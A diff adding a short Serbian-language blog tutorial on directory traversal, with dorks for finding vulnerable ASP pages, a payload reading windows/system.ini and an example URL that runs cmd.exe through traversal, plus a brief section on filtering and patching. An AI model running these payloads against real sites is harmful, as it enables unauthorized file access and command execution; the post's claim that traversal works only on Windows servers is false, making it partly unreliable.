@@ -1,0 +1,46 @@
+---
+title: "Directory Traversal"
+publishedAt: "2024-08-15"
+summary: "My first post on my new blog."
+---
+
+# [ Directory Traversal ]
+
+### [ Content ]
+
+[1] Sta je Directory Traversal \
+[2] Kako pronaci ranjivost \
+[3] Primer napada \
+[4] Zastita skripte
+
+
+[1] Uvod
+Directory Traversal je slicna metodi LFI s tim da se jedino moze koristiti na Windows serverima . Nakon pronalazenja ranjivosti ne uploaduje shell nego se izvrasava neka akcija pokretanjem .exe fajlova.
+
+[2] Kako pronaci ranjivost
+
+Neki dorkovi su:
+```code
+index.asp?page=
+index.asp?p=
+view.asp?site=
+```
+
+Ako naidjemo na ranjiv sajt (primer)
+```code
+http://vulnsajt.rs/stranica.asp?str=onama.html
+```
+
+Brisanjem dela linka onama.html i dodavanjem sufiksa ../../../../../../../../windows/system.iniUkoliko je sajt ranjiv ispisace podatke koji se nalaze u fajlu system.ini (U zavisnosti od servera i foldera u kom je ranjiva skripta stavljena neki podfolder ili tako nesto menja se broj ../ tako da je najbolje da se krene od ../../../../../windows/system.ini pa da se redom dodaju)
+
+[3] Primer napada
+Posto je sajt ranjiv vreme je da krenemo u napad. ../../../../../../../../windows/system.ini se zameni sa jednom exekutabilnom adresom npr. ../../../../../../../../Windows/System32/
+cmd.exe?/c+dir+c:\
+
+tako da link sada izgleda ovako
+```code
+http://vulnsajt.rs/page.asp?str=../../../../../../../../Windows/System32/cmd.exe?/c+dir+c:\
+```
+
+[4] Zastita skripte
+Jedan nacin zastite je da se apdejtuje verzija web server programa, a drugi nacin je da se naprave dobri filter koji ce blokirati napade ako se u linku nadju ../, windows, systen32 itd.
